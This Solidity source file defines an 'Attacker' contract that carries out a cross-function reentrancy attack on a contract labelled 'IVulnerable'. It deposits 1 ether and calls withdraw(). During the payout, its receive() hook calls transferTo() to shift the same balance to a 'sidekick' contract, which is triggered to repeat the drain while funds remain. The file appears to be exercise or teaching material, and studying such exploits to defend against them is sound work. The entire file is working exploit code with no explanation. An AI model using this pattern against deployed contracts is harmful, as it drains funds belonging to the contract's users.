// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

interface IVulnerable {
    function withdraw() external;

    function deposit() external payable;

    function transferTo(address _recipient, uint _amount) external;
}

interface ISidekick {
    function exploit() external payable;
}

contract Attacker {
    IVulnerable public target;
    ISidekick public sidekick;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function setSidekick(address _sidekick) public {
        sidekick = ISidekick(_sidekick);
    }

    receive() external payable {
        target.transferTo(address(sidekick), 1 ether);
    }

    function exploit() public payable {
        target.deposit{value: 1 ether}();

        target.withdraw();

        if (address(target).balance >= 1 ether) {
            sidekick.exploit();
        }
    }
}
